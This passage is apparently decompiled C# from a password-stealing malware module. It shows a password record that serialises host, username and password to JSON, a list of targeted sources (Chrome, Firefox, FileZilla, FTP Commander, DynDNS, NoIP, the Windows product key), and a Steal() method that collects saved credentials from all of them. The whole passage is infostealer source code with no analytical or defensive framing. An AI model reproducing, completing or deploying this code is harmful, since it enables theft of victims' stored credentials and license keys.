						ReadTableFromOffset(Convert.ToUInt64(decimal.Multiply(decimal.Subtract(new decimal(ConvertToInteger(Convert.ToInt32(decimal.Add(new decimal(Offset), new decimal(8L))), 4)), 1m), new decimal(page_size))));
					}
					return true;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					bool result = true;
					ProjectData.ClearProjectError();
					return result;
				}
			}
		}
	}

	public class Password
	{
		public string Host;

		public string Username;

		public string Password;

		public PasswordSource Source;

		public Password(string Host, string Username, string Password, PasswordSource Source)
		{
			this.Host = Host;
			this.Username = Username;
			this.Password = Password;
			this.Source = Source;
		}

		public Types.JSONObject ToJSON()
		{
			Types.JSONObject jSONObject = new Types.JSONObject();
			Types.JSONObject jSONObject2 = jSONObject;
			jSONObject2.Add("host", Host);
			jSONObject2.Add("user", Username);
			jSONObject2.Add("pass", Password);
			jSONObject2.Add("source", (int)Source);
			jSONObject2 = null;
			return jSONObject;
		}
	}

	public class Passwords : List<Password>
	{
		public void Add(string Host, string Username, string Password, PasswordSource Source)
		{
			Add(new Password(Host, Username, Password, Source));
		}

		public Types.JSONArray ToJSON()
		{
			Types.JSONArray jSONArray = new Types.JSONArray();
			using (Enumerator enumerator = GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Password current = enumerator.Current;
					jSONArray.Add(current.ToJSON());
				}
			}
			return jSONArray;
		}
	}

	public enum PasswordSource
	{
		GoogleChrome,
		MozillaFirefox,
		FileZilla,
		FtpCommander,
		DynDNS,
		NoIP,
		WindowsKey
	}

	public static Passwords Steal()
	{
		Passwords passwords = new Passwords();
		passwords.AddRange(GoogleChrome.Steal());
		passwords.AddRange(MozillaFirefox.Steal());
		passwords.AddRange(FileZilla.Steal());
		passwords.AddRange(FTPCommander.Steal());
		passwords.AddRange(DynDNS.Steal());
		passwords.AddRange(NoIP.Steal());
		passwords.AddRange(WindowsKey.Steal());
		return passwords;
	}
}
